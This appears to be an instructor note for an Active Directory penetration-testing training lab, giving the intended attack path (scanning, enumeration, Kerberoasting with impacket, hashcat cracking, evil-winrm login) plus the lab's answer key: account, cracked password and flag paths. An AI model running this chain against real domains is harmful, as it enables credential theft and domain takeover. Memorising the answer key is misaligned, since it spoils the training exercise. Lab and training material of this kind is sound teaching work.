# Coach context — Domain Join

## Intended path

1. `nmap -p 88,135,139,389,445,636,3389 <dc01>` → AD signature.
2. Enum: `netexec smb <dc01>` (domain name confirms `CORP`),
   `enum4linux-ng -A`, or anonymous ldap binds → users incl. `svc-backup`.
3. Roast: `impacket-GetUserSPNs corp.pentrain.local/<user> -dc-ip <dc>
   -request` — or AS-REP path `GetNPUsers` if no creds are needed.
   Ticket (RC4) → `hashcat -m 13100` → password `Backup2024!`.
4. `evil-winrm -i <dc01> -u svc-backup -p 'Backup2024!'` or psexec →
   `C:\flags\domain-admin.txt` → **dc-flag**;
   `C:\Windows\SYSVOL\domain\scripts\flag.txt` → **sysvol-flag** (readable
   even as an unprivileged domain user — `\\dc01\SYSVOL`).

## Key facts (stage 2–3 only)

- The roastable account: `svc-backup`, password `Backup2024!`, has an SPN +
  Domain Admin rights (intentionally over-privileged — that's the lesson).
- Both flags use file paths via guest agent: `C:\flags\domain-admin.txt`,
  `C:\Windows\SYSVOL\domain\scripts\flag.txt`.
- `kind: command` flags don't exist on Windows — trainees must cat the file
  content and submit the `pentrAIn{...}` string.

## Common wrong turns

- Spraying SMB logins — lockouts; roast first, spray never.
- Cracking with mode 5600 (NTLM) on a Kerberos ticket — it's 13100 (TGS-RC4)
  or 18200 (AS-REP).
- Forgetting `-dc-ip`/explicit DC — name resolution inside the range is
  limited; always pin the DC IP.
